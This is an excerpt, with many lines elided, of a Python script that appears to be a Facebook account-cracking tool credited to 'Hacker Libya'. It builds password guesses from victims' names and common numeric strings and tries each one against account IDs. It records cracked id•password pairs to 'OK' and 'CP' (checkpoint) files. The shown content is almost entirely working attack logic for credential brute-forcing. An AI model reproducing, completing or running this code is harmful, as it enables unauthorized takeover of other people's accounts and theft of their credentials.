...
def banner():
    print("\n%s    _________ __     \n%s   / ____/ (_) /____  ║ %sDesign By %sAhmed %s& %sAhmed X Alzwage\n%s  / __/ / / / __/ _ \ ║ %sFB %s: %sFacebook.com/AhmedAlzwage.02\n%s / /___/ / / /_/  __/ ║ %sFB %s: %sHacker Libya II\n%s/_____/_/_/\__/\___/  ║ %sGithub %s: %sGithub.com/AhmedAlzwage\n"%(O,O,P,O,P,O,O,P,O,P,O,P,O,P,O,P,O,P))
def menu_log():
    ...
    for i in _cici_.split(" "):
        if len(i)<3:
            ...
            if len(i)==3 or len(i)==4 or len(i)==5:
            	...
            	_dapunta_.append(i)
    _dapunta_.append("1122334455")
    _dapunta_.append("1234554321")
    _dapunta_.append("112233445566")
    _dapunta_.append("123456654321")
    return _dapunta_
    ...
    for i in _cici_.split(" "):
        if len(i)<3:
            ...
            if len(i)==3 or len(i)==4 or len(i)==5:
                ...
                _dapunta_.append(i)
    _dapunta_.append("19991999")
    _dapunta_.append("20002000")
            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    try:
                        ...
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        print("\r%s[%sAZ%s] %s • %s • %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                    ...
                    print("\r%s[%AZ%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id"))))
        ...
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    print("\r%s[%sAZ%s] %s • %s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
                    print("")
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
        ...
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    print("\r%s[%sAZ%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    h_ok = "\r%s[%sAZ%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    try:
                        ...
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        h_cp = "\r%s[%sAZ%s] %s • %s • %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id")))
                    ...
                    h_cp = "\r%s[%sAZ%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id")))
                    cek_log(fl.get("id"),i,h_cp)
                    print("")
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
